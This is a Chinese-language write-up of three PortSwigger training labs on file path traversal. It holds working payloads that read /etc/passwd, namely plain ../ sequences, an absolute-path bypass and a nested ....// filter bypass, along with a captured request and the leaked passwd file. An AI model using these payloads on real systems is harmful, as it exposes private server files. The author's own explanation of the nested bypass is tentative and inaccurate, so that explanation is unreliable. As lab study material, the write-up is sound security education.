#portswigger训练场中file-path-traversal#
漏洞原理：
访问文件中有关键的路径信息，如购物网站中，有图片信息，图片加载基于以下的HTML语句：

    <img src="/loadImage?filename=218.png">

一般图片是存储在/var/www/images/目录下的，该语句即访问/var/www/images/218.png。
若应用没有实现防御目录跨越攻击，攻击者可以请求以下的URL：

    https://insecure-website.com/loadImage?filename=../../../etc/passwd

即后台执行后，访问的语句为：

    /var/www/images/../../../etc/passwd

实现访问passwd的目的。

windows访问文件用反斜杠：

    https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini

###lab1###
展现image的时候有个file-path-traversal漏洞
实现：
在burp的proxy中，打开options，在intercept Server Responses选项中，勾选上intercept responses based on the following rules: Master interception is turned off。勾选上这个才能截断向服务器加载图片的请求，抓到该请求包。一般情况下只会抓到整个网页的请求包。

访问网页，burp抓到如下包：

    GET /image?filename=8.jpg HTTP/1.1
    Host: ac971f401f151ae1c05d37d700e60098.web-security-academy.net
    Cookie: session=N6b7PHmfoHCWrujgeuEgCYP2pNgjn8ID
    Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
    Sec-Ch-Ua-Mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
    Sec-Ch-Ua-Platform: "Windows"
    Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: no-cors
    Sec-Fetch-Dest: image
    Referer: https://ac971f401f151ae1c05d37d700e60098.web-security-academy.net/
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close

将请求中的filename改为../../../etc/passwd，Repeater发送，则得到passwd文件，如下：

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    peter:x:12001:12001::/home/peter:/bin/bash
    carlos:x:12002:12002::/home/carlos:/bin/bash
    user:x:12000:12000::/home/user:/bin/bash
    elmer:x:12099:12099::/home/elmer:/bin/bash
    academy:x:10000:10000::/academy:/bin/bash
    messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
    dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin

###lab2###
应用程序会阻止遍历序列，如../../之类被屏蔽，但会将提供的文件名视为相对于默认工作目录。
设法绕过：采用绝对路径访问，用/etc/passwd

实现：burp抓包，filename改为/etc/passwd

###lab3###
应用条带话路径遍历序列

绕过：采用嵌套式路径

payload：....//....//....//etc/passwd

说明：..和/相互抵消，也就是说，....//等同于../   理解不一定对